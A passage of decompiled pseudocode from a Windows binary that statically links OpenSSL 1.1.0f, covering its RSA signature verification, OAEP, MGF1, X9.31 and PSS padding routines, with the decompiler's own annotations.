  v17 = sub_14005E340((unsigned int)a7, a6, (__int64)v15, a8);
  v18 = v17;
  if ( v17 <= 0 )
    goto LABEL_42;
  if ( a1 != 114 )
  {
    if ( a1 == 95 && v17 == 18 && *v16 == 4 && v16[1] == 16 )
    {
      if ( a4 )
      {
        v19 = 1;
        *a4 = *(_OWORD *)(v16 + 2);
        *a5 = 16i64;
        goto LABEL_43;
      }
      if ( (_DWORD)v9 != 16 )
      {
        sub_140024610(4, 145, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 184);
        goto LABEL_42;
      }
      if ( *a2 != *(_QWORD *)(v16 + 2) || a2[1] != *(_QWORD *)(v16 + 10) )
      {
        v24 = 189;
        goto LABEL_9;
      }
    }
    else
    {
      if ( a4 )
      {
        v20 = sub_14002C1A0(a1);
        v21 = sub_14001E990((__int64)v20);
        if ( !v21 )
        {
          sub_140024610(4, 145, 117, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 202);
          goto LABEL_42;
        }
        v22 = sub_1400253D0(v21);
        v9 = v22;
        if ( v22 > v18 )
        {
          sub_140024610(4, 145, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 208);
          goto LABEL_42;
        }
        a2 = &v16[v18 - v22];
      }
      v23 = sub_14006BF20(&Buf1, &v25, a1, (__int64)a2, v9);
      v13 = Buf1;
      if ( !v23 )
      {
        v12 = v25;
        goto LABEL_42;
      }
      v12 = v25;
      if ( v25 != (_DWORD)v18 || memcmp(Buf1, v16, v25) )
      {
        v24 = 220;
        goto LABEL_9;
      }
      if ( a4 )
      {
        memmove(a4, a2, v9);
        *a5 = v9;
      }
    }
LABEL_39:
    v19 = 1;
    goto LABEL_43;
  }
  if ( v17 != 36 )
  {
    v24 = 155;
LABEL_9:
    sub_140024610(4, 145, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", v24);
    goto LABEL_42;
  }
  if ( !a4 )
  {
    if ( (_DWORD)v9 != 36 )
    {
      sub_140024610(4, 145, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 164);
      goto LABEL_42;
    }
    if ( memcmp(v16, a2, 0x24ui64) )
    {
      v24 = 169;
      goto LABEL_9;
    }
    goto LABEL_39;
  }
  v19 = 1;
  *a4 = *(_OWORD *)v16;
  a4[1] = *((_OWORD *)v16 + 1);
  *((_DWORD *)a4 + 8) = *((_DWORD *)v16 + 8);
  *a5 = 36i64;
LABEL_43:
  sub_14001DA40(v13, v12, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 0xEAu);
  sub_14001DA40(v16, a7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 0xEBu);
  return v19;
}

//----- (000000014006C390) ----------------------------------------------------
__int64 __fastcall sub_14006C390(__int64 a1, __int64 a2, unsigned int a3, __int64 a4, int *a5, __int64 a6)
{
  int v6; // eax
  unsigned int v8; // edi
  unsigned int v9; // ebp
  int v10; // edx
  size_t v12; // rsi
  unsigned __int8 *v13; // rax
  unsigned __int8 *v14; // rbx
  int v15; // eax
  unsigned int v16[2]; // [rsp+30h] [rbp-38h] BYREF
  __int64 v17; // [rsp+38h] [rbp-30h]
  unsigned __int8 *v18; // [rsp+78h] [rbp+10h] BYREF

  v17 = a2;
  v16[1] = 4;
  v16[0] = a3;
  v8 = v6 - 79;
  v9 = sub_140050070(v16, 0i64);
  v10 = sub_14005E580(a6);
  if ( (int)v9 <= v10 - 11 )
  {
    v12 = (unsigned int)(v10 + 1);
    v13 = (unsigned __int8 *)sub_14001D8E0(v12);
    v14 = v13;
    if ( v13 )
    {
      v18 = v13;
      sub_140050070(v16, &v18);
      v15 = sub_14005E320(v9, (__int64)v14, a4, a6);
      if ( v15 > 0 )
        *a5 = v15;
      else
        v8 = 0;
      sub_14001DA40(v14, v12, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_saos.c", 0x32u);
      return v8;
    }
    else
    {
      sub_140024610(4, 118, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_saos.c", 39);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v8 + 3, v8 + 117, v8 + 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_saos.c", 34);
    return 0i64;
  }
}
// 14006C3BE: variable 'v6' is possibly undefined

//----- (000000014006C4D0) ----------------------------------------------------
__int64 __fastcall sub_14006C4D0(__int64 a1, int a2, __int64 a3, __int64 a4, int *a5)
{
  int *v5; // rdi
  int v8; // ebx
  unsigned int v9; // r13d
  __int64 *v10; // rsi
  int v11; // r15d
  int v12; // ebp
  char Src[64]; // [rsp+40h] [rbp-98h] BYREF

  v5 = a5;
  v8 = 0;
  v9 = -1;
  v10 = (__int64 *)sub_14006DFD0();
  if ( v10 )
  {
    v11 = sub_1400253D0((__int64)a5);
    if ( v11 >= 0 )
    {
      v12 = 0;
      if ( a2 <= 0 )
      {
LABEL_13:
        v9 = 0;
      }
      else
      {
        while ( (unsigned int)sub_14006DB20((__int64)v10, v5, 0i64)
             && (unsigned int)sub_14006DD90((__int64)v10)
             && (unsigned int)sub_14006DD90((__int64)v10) )
        {
          if ( v11 + v8 > a2 )
          {
            if ( !(unsigned int)sub_14006DA80(v10, (__int64)Src, 0i64) )
              break;
            memmove((void *)(a1 + v8), Src, a2 - v8);
            v8 = a2;
          }
          else
          {
            if ( !(unsigned int)sub_14006DA80(v10, a1 + v8, 0i64) )
              break;
            v8 += v11;
          }
          v5 = a5;
          ++v12;
          if ( v8 >= a2 )
            goto LABEL_13;
        }
      }
    }
  }
  sub_14006DF90(v10);
  return v9;
}

//----- (000000014006C660) ----------------------------------------------------
__int64 __fastcall sub_14006C660(_BYTE *a1, int a2, const void *a3, int a4, __int64 a5, int a6)
{
  return sub_14006C6A0(a1, a2, a3, a4, a5, a6, 0i64, 0i64);
}

//----- (000000014006C6A0) ----------------------------------------------------
__int64 __fastcall sub_14006C6A0(_BYTE *a1, int a2, const void *a3, int a4, __int64 a5, int a6, int *a7, __int64 a8)
{
  int *v8; // rbp
  int v9; // esi
  __int64 v11; // rbx
  int v13; // eax
  __int64 v14; // rdi
  int v15; // eax
  int v16; // r13d
  unsigned __int64 v18; // r15
  const __m128i *v19; // r12
  __int64 v20; // rbx
  int v21; // r14d
  int v22; // esi
  _BYTE *v23; // r13
  int v24; // edx
  __int64 v25; // rcx
  char *v26; // r8
  const __m128i *v27; // rcx
  __m128i v28; // xmm0
  __m128i v29; // xmm1
  _BYTE *v30; // rcx
  __int64 v31; // rbp
  __int64 v32; // rcx
  int v33; // edi
  const __m128i *v34; // rcx
  __m128i v35; // xmm0
  __m128i v36; // xmm1
  const __m128i *v37; // rcx
  __int64 v38; // rbx
  int *v40; // [rsp+38h] [rbp-B0h]
  __m128i v42; // [rsp+50h] [rbp-98h] BYREF
  char v43[48]; // [rsp+60h] [rbp-88h] BYREF

  v8 = a7;
  v9 = a2 - 1;
  v11 = a8;
  if ( !a7 )
    v8 = (int *)sub_14005BAC0();
  if ( !a8 )
    v11 = (__int64)v8;
  v40 = (int *)v11;
  v13 = sub_1400253D0((__int64)v8);
  v14 = v13;
  v15 = 2 * v13;
  v16 = v9 - v15;
  if ( a4 > v9 - v15 - 1 )
  {
    sub_140024610(4, 154, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_oaep.c", 60);
    return 0i64;
  }
  if ( v9 < v15 + 1 )
  {
    sub_140024610(4, 154, 120, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_oaep.c", 66);
    return 0i64;
  }
  v18 = (unsigned __int64)&a1[v14 + 1];
  *a1 = 0;
  v19 = (const __m128i *)(a1 + 1);
  v20 = v14;
  v21 = 0;
  if ( !(unsigned int)sub_14006D970(a5, a6, v18, 0i64, v8, 0i64) )
    return 0i64;
  memset((void *)(v14 + v18), 0, v16 - a4 - 1);
  *(_BYTE *)(v9 - a4 - (int)v14 - 1 + v18) = 1;
  memmove((void *)(v18 + v9 - (__int64)a4 - v14), a3, (unsigned int)a4);
  if ( (int)sub_140025460((__int64)v19, v14) <= 0 )
    return 0i64;
  v22 = v9 - v14;
  v23 = sub_14001D8E0(v22);
  if ( !v23 )
  {
    sub_140024610(4, 154, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_oaep.c", 89);
    return 0i64;
  }
  if ( (int)sub_14006C4D0((__int64)v23, v22, (__int64)v19, (unsigned int)v14, v40) < 0 )
    goto LABEL_32;
  v24 = 0;
  if ( v22 >= 32 )
  {
    v25 = v22 - 1;
    if ( v18 > (unsigned __int64)&v23[v25] || v25 + v18 < (unsigned __int64)v23 )
    {
      v26 = &v23[-v18];
      v27 = (const __m128i *)v18;
      do
      {
        v28 = _mm_loadu_si128(v27);
        v24 += 32;
        v29 = _mm_loadu_si128((const __m128i *)((char *)v27 + (_QWORD)v26));
        v27 += 2;
        v27[-2] = _mm_xor_si128(v29, v28);
        v27[-1] = _mm_xor_si128(
                    _mm_loadu_si128((const __m128i *)((char *)v27 + (_QWORD)v26 - 16)),
                    _mm_loadu_si128(v27 - 1));
      }
      while ( (__int64)((__int64)v27->m128i_i64 - v18) < v22 - (v22 & 0x1F) );
    }
  }
  if ( v24 < (__int64)v22 )
  {
    v30 = (_BYTE *)(v24 + v18);
    v31 = v22 - (__int64)v24;
    do
    {
      *v30 ^= v23[(_QWORD)v30 - v18];
      ++v30;
      --v31;
    }
    while ( v31 );
  }
  if ( (int)sub_14006C4D0((__int64)&v42, v14, v18, (unsigned int)v22, v40) < 0 )
  {
LABEL_32:
    sub_14001D930(v23);
    return 0i64;
  }
  if ( (int)v14 >= 32 )
  {
    v32 = (int)v14 - 1;
    if ( v19 > (const __m128i *)&v42.m128i_i8[v32] || &v19->m128i_i8[v32] < (__int8 *)&v42 )
    {
      v33 = v14 - (v14 & 0x1F);
      v34 = v19;
      do
      {
        v35 = _mm_loadu_si128(v34);
        v21 += 32;
        v36 = _mm_loadu_si128((const __m128i *)((char *)v34 + (char *)&v42 - (char *)v19));
        v34 += 2;
        v34[-2] = _mm_xor_si128(v36, v35);
        v34[-1] = _mm_xor_si128(
                    _mm_loadu_si128((const __m128i *)((char *)v34 + v43 - (char *)v19 - 32)),
                    _mm_loadu_si128(v34 - 1));
      }
      while ( (char *)v34 - (char *)v19 < v33 );
    }
  }
  if ( v21 < v20 )
  {
    v37 = &v19[v21 / 0x10u];
    v38 = v20 - v21;
    do
    {
      v37->m128i_i8[0] ^= v37->m128i_u8[(char *)&v42 - (char *)v19];
      v37 = (const __m128i *)((char *)v37 + 1);
      --v38;
    }
    while ( v38 );
  }
  sub_14001D930(v23);
  return 1i64;
}
// 14006C8BD: conditional instruction was optimized away because esi.4>=20
// 14006C99D: conditional instruction was optimized away because edi.4>=20
// 14006C8B7: mask 0x8000001F is shortened because esi.4 <= 0x7FFFFFFF
// 14006C998: mask 0x8000001F is shortened because edi.4 <= 0x7FFFFFFF
// 14006C6A0: using guessed type __m128i var_98;
// 14006C6A0: using guessed type char var_88[48];

//----- (000000014006CA90) ----------------------------------------------------
__int64 __fastcall sub_14006CA90(void *a1, int a2, const void *a3, int a4, int a5, __int64 a6, int a7)
{
  return sub_14006CAE0(a1, a2, a3, a4, a5, a6, a7, 0i64, 0i64);
}

//----- (000000014006CAE0) ----------------------------------------------------
__int64 __fastcall sub_14006CAE0(
        void *a1,
        int a2,
        const void *a3,
        int a4,
        int a5,
        __int64 a6,
        int a7,
        int *a8,
        __int64 a9)
{
  int v9; // esi
  int v10; // r15d
  __int64 v11; // rbx
  char *v13; // rdi
  int *v14; // rax
  unsigned __int8 *v15; // r14
  size_t v16; // r12
  int v17; // eax
  __int64 v18; // rbx
  int v19; // r14d
  unsigned __int8 *v20; // rax
  unsigned __int8 *v21; // rbp
  unsigned __int64 v22; // r12
  __int64 v23; // rdx
  __int64 v24; // rcx
  __int64 v25; // rcx
  signed __int64 v26; // r8
  __m128i *v27; // rax
  signed __int64 v28; // rbp
  char *v29; // rcx
  int v30; // edx
  __int64 v31; // rcx
  unsigned __int64 v32; // r8
  const __m128i *v33; // rcx
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  unsigned __int64 v36; // r12
  char *v37; // rcx
  __int64 v38; // rdx
  int v39; // eax
  int v40; // r9d
  unsigned int v41; // r11d
  char *v42; // r10
  __int64 v43; // rbp
  int v44; // r8d
  unsigned int v45; // edx
  int v46; // ecx
  int v47; // eax
  int v48; // ecx
  unsigned __int8 *v50; // [rsp+30h] [rbp-F8h]
  unsigned int v52; // [rsp+3Ch] [rbp-ECh]
  int *v53; // [rsp+40h] [rbp-E8h]
  int *v54; // [rsp+48h] [rbp-E0h]
  char v56[64]; // [rsp+60h] [rbp-C8h] BYREF
  char v57[64]; // [rsp+A0h] [rbp-88h] BYREF

  v9 = 0;
  v10 = -1;
  v11 = a9;
  v13 = 0i64;
  v14 = a8;
  v15 = 0i64;
  v16 = a4;
  v54 = a8;
  if ( !a8 )
  {
    v14 = (int *)sub_14005BAC0();
    v54 = v14;
  }
  if ( !a9 )
    v11 = (__int64)v14;
  v53 = (int *)v11;
  v17 = sub_1400253D0((__int64)v14);
  v18 = v17;
  if ( a2 > 0 && (int)v16 > 0 )
  {
    if ( a5 < (int)v16 || a5 < 2 * v17 + 2 )
      goto LABEL_37;
    v19 = a5 - v17 - 1;
    v13 = (char *)sub_14001D8E0(v19);
    v20 = (unsigned __int8 *)sub_14001D8E0(a5);
    v50 = v20;
    if ( v13 && v20 )
    {
      memset(v20, 0, a5);
      memmove(&v50[a5 - v16], a3, v16);
      v21 = v50 + 1;
      v22 = (unsigned __int64)&v50[v18 + 1];
      v52 = -(((unsigned int)*v50 - 1) >> 31);
      if ( !(unsigned int)sub_14006C4D0((__int64)v56, v18, v22, (unsigned int)v19, v53) )
      {
        LODWORD(v23) = 0;
        if ( (int)v18 >= 32 )
        {
          v24 = (int)v18 - 1;
          if ( v56 > (char *)&v21[v24] || &v56[v24] < (char *)v21 )
          {
            v25 = 0i64;
            v26 = v21 - (unsigned __int8 *)v56;
            do
            {
              LODWORD(v23) = v23 + 32;
              v27 = (__m128i *)&v56[v25];
              v25 += 32i64;
              *v27 = _mm_xor_si128(_mm_loadu_si128((__m128i *)((char *)v27 + v26)), _mm_loadu_si128(v27));
              v27[1] = _mm_xor_si128(_mm_loadu_si128((__m128i *)((char *)v27 + v26 + 16)), _mm_loadu_si128(v27 + 1));
            }
            while ( v25 < (int)(v18 - (v18 & 0x1F)) );
          }
        }
        v23 = (int)v23;
        if ( (int)v23 < v18 )
        {
          v28 = v21 - (unsigned __int8 *)v56;
          do
          {
            v29 = &v56[v23++];
            *v29 ^= v29[v28];
          }
          while ( v23 < v18 );
        }
        if ( !(unsigned int)sub_14006C4D0((__int64)v13, v19, (__int64)v56, (unsigned int)v18, v53) )
        {
          v30 = 0;
          if ( v19 >= 32 )
          {
            v31 = v19 - 1;
            if ( (unsigned __int64)v13 > v31 + v22 || (unsigned __int64)&v13[v31] < v22 )
            {
              v32 = v22 - (_QWORD)v13;
              v33 = (const __m128i *)v13;
              do
              {
                v34 = _mm_loadu_si128(v33);
                v30 += 32;
                v35 = _mm_loadu_si128((const __m128i *)((char *)v33 + v32));
                v33 += 2;
                v33[-2] = _mm_xor_si128(v35, v34);
                v33[-1] = _mm_xor_si128(
                            _mm_loadu_si128((const __m128i *)((char *)v33 + v32 - 16)),
                            _mm_loadu_si128(v33 - 1));
              }
              while ( (char *)v33 - v13 < v19 - (v19 & 0x1F) );
            }
          }
          if ( v30 < (__int64)v19 )
          {
            v36 = v22 - (_QWORD)v13;
            v37 = &v13[v30];
            v38 = v19 - (__int64)v30;
            do
            {
              *v37 ^= v37[v36];
              ++v37;
              --v38;
            }
            while ( v38 );
          }
          if ( (unsigned int)sub_14006D970(a6, a7, (__int64)v57, 0i64, v54, 0i64) )
          {
            v39 = sub_140023460(v13, (__int64)v57, v18);
            v40 = 0;
            v41 = -((v39 >= 0) & ((unsigned int)(v39 - 1) >> 31)) & v52;
            if ( v18 < v19 )
            {
              v42 = &v13[v18];
              v43 = v19 - v18;
              do
              {
                v44 = (unsigned __int8)*v42++;
                v45 = -((v44 >= 0) & (((v44 ^ 1u) - 1) >> 31));
                v46 = v45 & ~v40;
                v40 |= v45;
                v47 = v46;
                v48 = v18 & v46;
                LODWORD(v18) = v18 + 1;
                v9 = v48 | ~v47 & v9;
                v41 &= v40 | -((v44 >= 0) & ((unsigned int)(v44 - 1) >> 31));
                --v43;
              }
              while ( v43 );
            }
            if ( (v40 & v41) == 0 )
              goto LABEL_36;
            v10 = v19 - (v9 + 1);
            if ( a2 < v10 )
            {
              sub_140024610(4, 153, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_oaep.c", 227);
LABEL_36:
              v15 = v50;
LABEL_37:
              sub_140024610(4, 153, 121, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_oaep.c", 240);
              v10 = -1;
LABEL_40:
              sub_14001D930(v13);
              sub_14001D930(v15);
              return (unsigned int)v10;
            }
            memmove(a1, &v13[v9 + 1], v10);
          }
        }
      }
    }
    else
    {
      sub_140024610(4, 153, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_oaep.c", 160);
    }
    v15 = v50;
    goto LABEL_40;
  }
  return 0xFFFFFFFFi64;
}
// 14006CC98: conditional instruction was optimized away because ebx.4>=20
// 14006CD82: conditional instruction was optimized away because r14d.4>=20
// 14006CC92: mask 0x8000001F is shortened because ebx.4 <= 0x7FFFFFFF
// 14006CD7C: mask 0x8000001F is shortened because r14d.4 <= 0x7FFFFFFF

//----- (000000014006CFD0) ----------------------------------------------------
__int64 __fastcall sub_14006CFD0(int a1)
{
  int v1; // ecx
  int v2; // ecx
  int v3; // ecx

  v1 = a1 - 64;
  if ( !v1 )
    return 51i64;
  v2 = v1 - 608;
  if ( !v2 )
    return 52i64;
  v3 = v2 - 1;
  if ( !v3 )
    return 54i64;
  if ( v3 == 1 )
    return 53i64;
  return 0xFFFFFFFFi64;
}

//----- (000000014006D010) ----------------------------------------------------
__int64 __fastcall sub_14006D010(_BYTE *a1, int a2, const void *a3, int a4)
{
  int v4; // eax
  __int64 v5; // rsi
  int v7; // edx
  __int64 result; // rax
  _BYTE *v9; // rdi
  size_t v10; // rbx
  _BYTE *v11; // rbx

  v5 = a4;
  v7 = a2 - a4 - 2;
  if ( v7 >= 0 )
  {
    if ( v7 )
    {
      v9 = a1 + 1;
      *a1 = 107;
      if ( v7 > 1 )
      {
        v10 = v7 - 1;
        memset(a1 + 1, 187, v10);
        v9 += v10;
      }
      *v9 = -70;
      a1 = v9;
    }
    else
    {
      *a1 = 106;
    }
    v11 = a1 + 1;
    memmove(a1 + 1, a3, (unsigned int)v5);
    result = 1i64;
    v11[v5] = -52;
  }
  else
  {
    sub_140024610(v4 - 44, v4 + 79, v4 + 62, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_x931.c", 30);
    return 0xFFFFFFFFi64;
  }
  return result;
}
// 14006D042: variable 'v4' is possibly undefined

//----- (000000014006D0D0) ----------------------------------------------------
__int64 __fastcall sub_14006D0D0(void *a1, __int64 a2, _BYTE *a3, int a4, int a5)
{
  char *v6; // rdx
  int v7; // ebx
  int i; // eax
  char v9; // cl
  unsigned int v10; // ebx

  if ( a5 != a4 || (unsigned __int8)(*a3 - 106) > 1u )
  {
    sub_140024610(4, 128, 137, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_x931.c", 61);
    return 0xFFFFFFFFi64;
  }
  v6 = a3 + 1;
  if ( *a3 != 107 )
  {
    v10 = a4 - 2;
LABEL_13:
    if ( v6[v10] == -52 )
    {
      memmove(a1, v6, v10);
      return v10;
    }
    else
    {
      sub_140024610(4, 128, 139, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_x931.c", 88);
      return 0xFFFFFFFFi64;
    }
  }
  v7 = a4 - 3;
  for ( i = 0; i < v7; ++i )
  {
    v9 = *v6++;
    if ( v9 == -70 )
      break;
    if ( v9 != -69 )
    {
      sub_140024610(4, 128, 138, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_x931.c", 72);
      return 0xFFFFFFFFi64;
    }
  }
  v10 = v7 - i;
  if ( i )
    goto LABEL_13;
  sub_140024610(4, 128, 138, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_x931.c", 80);
  return 0xFFFFFFFFi64;
}

//----- (000000014006D1E0) ----------------------------------------------------
__int64 __fastcall sub_14006D1E0(__int64 a1, _BYTE *a2, __int64 a3, int *a4, __int64 a5, int a6)
{
  int v7; // ebp
  __int64 v8; // rcx
  __int8 *v10; // rsi
  int v11; // r15d
  signed int v12; // ebx
  int v13; // r13d
  int v14; // edi
  __int8 *v15; // rax
  __int64 v16; // r12
  __int64 *v17; // rax
  _BYTE *v18; // rdx
  __m128i *v19; // rdx
  __int64 v20; // rcx
  const __m128i *v21; // rcx
  __m128i v22; // xmm1
  __int64 v23; // r8
  __int8 v24; // al
  __int64 *v26; // [rsp+30h] [rbp-48h]
  int *v27; // [rsp+38h] [rbp-40h]
  int v29; // [rsp+A0h] [rbp+28h]

  v7 = 0;
  v8 = (__int64)a4;
  v26 = 0i64;
  v10 = 0i64;
  if ( a5 )
    v8 = a5;
  v27 = (int *)v8;
  v11 = sub_1400253D0((__int64)a4);
  if ( v11 >= 0 )
  {
    v12 = a6;
    if ( a6 == -1 )
    {
      v12 = v11;
    }
    else if ( a6 <= -3 )
    {
      sub_140024610(4, 152, 136, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 172);
      goto LABEL_39;
    }
    v29 = ((unsigned __int8)sub_140027260(*(_QWORD *)(a1 + 24)) - 1) & 7;
    v13 = sub_14005E580(a1);
    if ( !v29 )
    {
      *a2++ = 0;
      --v13;
    }
    if ( v13 >= v11 + 2 )
    {
      v14 = v13 - v11;
      if ( v12 == -2 )
      {
        v12 = v14 - 2;
      }
      else if ( v12 > v14 - 2 )
      {
        sub_140024610(4, 152, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 191);
        goto LABEL_39;
      }
      if ( v12 > 0 )
      {
        v15 = (__int8 *)sub_14001D8E0(v12);
        v10 = v15;
        if ( !v15 )
        {
          sub_140024610(4, 152, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 198);
          goto LABEL_39;
        }
        if ( (int)sub_140025460((__int64)v15, v12) <= 0 )
          goto LABEL_39;
      }
      v16 = (__int64)&a2[v14 - 1];
      v17 = (__int64 *)sub_14006DFD0();
      v26 = v17;
      if ( v17
        && (unsigned int)sub_14006DB20((__int64)v17, a4, 0i64)
        && (unsigned int)sub_14006DD90((__int64)v26)
        && (unsigned int)sub_14006DD90((__int64)v26)
        && (!v12 || (unsigned int)sub_14006DD90((__int64)v26))
        && (unsigned int)sub_14006DA80(v26, v16, 0i64)
        && !(unsigned int)sub_14006C4D0((__int64)a2, v14 - 1, v16, (unsigned int)v11, v27) )
      {
        v18 = &a2[v14 - v12 - 2];
        *v18 ^= 1u;
        v19 = (__m128i *)(v18 + 1);
        if ( v12 > 0 )
        {
          if ( (unsigned int)v12 >= 0x20 )
          {
            v20 = v12 - 1;
            if ( v19 > (__m128i *)&v10[v20] || &v19->m128i_i8[v20] < v10 )
            {
              v21 = (const __m128i *)(v10 + 16);
              do
              {
                v7 += 32;
                v22 = _mm_loadu_si128(v21 - 1);
                v21 += 2;
                *v19 = _mm_xor_si128(v22, _mm_loadu_si128(v19));
                v19[1] = _mm_xor_si128(_mm_loadu_si128(v19 + 1), _mm_loadu_si128(v21 - 2));
                v19 += 2;
              }
              while ( (__int64)v21->m128i_i64 - 16 - (__int64)v10 < v12 - (v12 & 0x1F) );
            }
          }
          v23 = v7;
          if ( v7 < (__int64)v12 )
          {
            do
            {
              v24 = v10[v23++];
              v19->m128i_i8[0] ^= v24;
              v19 = (__m128i *)((char *)v19 + 1);
            }
            while ( v23 < v12 );
          }
        }
        if ( v29 )
          *a2 &= 255 >> (8 - v29);
        v7 = 1;
        a2[v13 - 1] = -68;
      }
    }
    else
    {
      sub_140024610(4, 152, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 184);
    }
  }
LABEL_39:
  sub_14006DF90(v26);
  sub_14001D930(v10);
  return (unsigned int)v7;
}
// 14006D471: conditional instruction was optimized away because ebx.4>=20
// 14006D46B: mask 0x8000001F is shortened because ebx.4 <= 0x7FFFFFFF

//----- (000000014006D560) ----------------------------------------------------
__int64 __fastcall sub_14006D560(__int64 a1, __int64 a2, int *a3, int *a4, __int8 *a5, int a6)
{
  __int8 *v6; // rbx
  unsigned int v7; // r15d
  __m128i *v8; // rdi
  int v12; // eax
  int v13; // esi
  int v14; // r14d
  int v15; // r12d
  int v16; // r8d
  __int64 *v17; // rsi
  int v18; // ebp
  __m128i *v19; // rax
  int v20; // edx
  __int64 v21; // rcx
  signed __int64 v22; // r8
  const __m128i *v23; // rcx
  __m128i v24; // xmm0
  __m128i v25; // xmm1
  signed __int64 v26; // rbx
  __int8 *m128i_i8; // rcx
  __int64 v28; // rsi
  int v29; // ebx
  __m128i *v30; // rax
  __int64 v31; // rax
  int v32; // ebx
  __int64 *v34; // [rsp+30h] [rbp-C8h]
  int v35; // [rsp+38h] [rbp-C0h]
  __int8 *Buf2; // [rsp+40h] [rbp-B8h]
  char Buf1[64]; // [rsp+60h] [rbp-98h] BYREF

  v6 = a5;
  v7 = 0;
  v8 = 0i64;
  v34 = (__int64 *)sub_14006DFD0();
  if ( !v34 )
  {
    v17 = 0i64;
    goto LABEL_53;
  }
  if ( !a4 )
    a4 = a3;
  v12 = sub_1400253D0((__int64)a3);
  v35 = v12;
  v13 = v12;
  if ( v12 < 0 )
    goto LABEL_11;
  v14 = a6;
  if ( a6 == -1 )
  {
    v14 = v12;
  }
  else if ( a6 <= -3 )
  {
    sub_140024610(4, 126, 136, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 65);
    goto LABEL_11;
  }
  v15 = ((unsigned __int8)sub_140027260(*(_QWORD *)(a1 + 24)) - 1) & 7;
  v16 = sub_14005E580(a1);
  if ( ((unsigned __int8)(255 << v15) & (unsigned __int8)*a5) != 0 )
  {
    sub_140024610(4, 126, 133, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 72);
    v17 = v34;
    goto LABEL_53;
  }
  if ( !v15 )
  {
    v6 = a5 + 1;
    --v16;
  }
  if ( v16 < v13 + 2 )
  {
    sub_140024610(4, 126, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 80);
LABEL_16:
    v17 = v34;
    goto LABEL_53;
  }
  if ( v14 > v16 - v13 - 2 )
  {
    sub_140024610(4, 126, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 84);
    goto LABEL_16;
  }
  if ( v6[v16 - 1] != -68 )
  {
    sub_140024610(4, 126, 134, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 88);
    goto LABEL_16;
  }
  v18 = v16 - v13 - 1;
  Buf2 = &v6[v18];
  v19 = (__m128i *)sub_14001D8E0(v18);
  v8 = v19;
  if ( !v19 )
  {
    sub_140024610(4, 126, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 95);
    goto LABEL_16;
  }
  if ( (int)sub_14006C4D0((__int64)v19, v18, (__int64)Buf2, (unsigned int)v35, a4) < 0 )
  {
LABEL_11:
    v17 = v34;
    goto LABEL_53;
  }
  v20 = 0;
  if ( v18 >= 32 )
  {
    v21 = v18 - 1;
    if ( v8 > (__m128i *)&v6[v21] || &v8->m128i_i8[v21] < v6 )
    {
      v22 = v6 - (__int8 *)v8;
      v23 = v8;
      do
      {
        v24 = _mm_loadu_si128(v23);
        v20 += 32;
        v25 = _mm_loadu_si128((const __m128i *)((char *)v23 + v22));
        v23 += 2;
        v23[-2] = _mm_xor_si128(v25, v24);
        v23[-1] = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v23 + v22 - 16)), _mm_loadu_si128(v23 - 1));
      }
      while ( (char *)v23 - (char *)v8 < v18 - (v18 & 0x1F) );
    }
  }
  if ( v20 < (__int64)v18 )
  {
    v26 = v6 - (__int8 *)v8;
    m128i_i8 = v8[v20 / 0x10u].m128i_i8;
    v28 = v18 - (__int64)v20;
    do
    {
      *m128i_i8 ^= m128i_i8[v26];
      ++m128i_i8;
      --v28;
    }
    while ( v28 );
  }
  if ( v15 )
    v8->m128i_i8[0] &= 255 >> (8 - v15);
  v29 = 0;
  if ( !v8->m128i_i8[0] )
  {
    v30 = v8;
    do
    {
      if ( v29 >= v18 - 1 )
        break;
      v30 = (__m128i *)((char *)v30 + 1);
      ++v29;
    }
    while ( !v30->m128i_i8[0] );
  }
  v31 = v29;
  v32 = v29 + 1;
  if ( v8->m128i_i8[v31] != 1 )
  {
    sub_140024610(4, 126, 135, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 106);
    goto LABEL_16;
  }
  if ( v14 >= 0 && v18 - v32 != v14 )
  {
    sub_140024610(4, 126, 136, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 110);
    goto LABEL_11;
